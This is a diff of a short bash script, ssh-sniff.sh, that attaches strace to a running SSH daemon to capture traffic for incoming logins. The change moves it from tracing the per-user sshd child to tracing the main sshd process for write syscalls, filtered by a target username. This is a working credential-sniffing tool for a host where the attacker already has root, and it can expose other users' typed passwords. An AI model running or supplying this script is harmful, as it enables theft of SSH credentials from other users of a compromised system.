@@ -1,21 +1,24 @@
 #!/bin/bash
 # Tries to sniff incoming SSH connections
+if [ -z "$1" ]; then
+        echo "Usage: ./ssh-sniff.sh <username>"
+        exit 0
+fi
 
-while [ 1 ]
-do
-        # Get the PID of the child process
-        # NOTE: Need to replace the username with the person we're looking for!
-        USERNAME="testing"
-        PID=$(pgrep -f "sshd: $USERNAME \[priv\]")
+USERNAME=$1
 
-        if [ -z "$PID" ]
-        then
-                echo -en "\rWaiting for ssh connection..."
-        else
-                echo -e "\n"
-                strace -p $PID -e read
-        fi
+# Get the PID of the sshd process
+PID=$(pgrep -f "/usr/sbin/sshd -D")
 
-        # Sleep a bit
-        sleep 1
-done
+if [ -z "$PID" ]
+then
+        echo "sshd does not appear to be running!"
+        echo "Check manually using ps (it may have a different command line)"
+        exit 0
+fi
+        
+echo "Waiting for ssh connections from $USERNAME..."
+echo "Ctrl+C to exit"
+
+# Trace the sshd process for write events, and grep for the username
+strace -f -p $PID -e write 2>&1 | grep -B 2 -A 20 $USERNAME
